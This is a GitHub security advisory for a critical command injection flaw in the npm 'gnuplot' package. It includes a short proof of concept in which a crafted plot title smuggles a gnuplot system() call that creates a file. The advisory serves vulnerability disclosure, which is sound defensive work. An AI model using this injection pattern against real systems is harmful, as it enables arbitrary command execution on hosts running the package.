# [C] Command Injection in gnuplot

## Summary
Severity: Critical
Advisory: GHSA-cfwc-xjfp-44jg
CWE: CWE-77
Ecosystem: npm
Published: 2020-09-04
Source: https://github.com/advisories/GHSA-cfwc-xjfp-44jg
Type: github-advisory

## Affected
- npm: `gnuplot` — affected >=0.0.0

## Details
All versions of `gnuplot` are vulnerable to Command Injection. The package fails to sanitize plot titles, which may allow attackers to execute arbitrary code in the system if the title value is supplied by a user. The following proof-of-concept creates a `testing` file in the current directory:

```
var gnuplot = require('gnuplot');

const title = '"\nset title system("touch testing")\n#';

gnuplot()
.set('term png')
.set('output "out.png"')
.set(`title "${title}"`)
.set('xrange [-10:10]')
.set('yrange [-2:2]')
.set('zeroaxis')
.plot('(x/4)**2, sin(x), 1/x')
.end();
```


## Recommendation

No fix is currently available. Consider using an alternative package until a fix is made available.

## References
- https://www.npmjs.com/advisories/1440
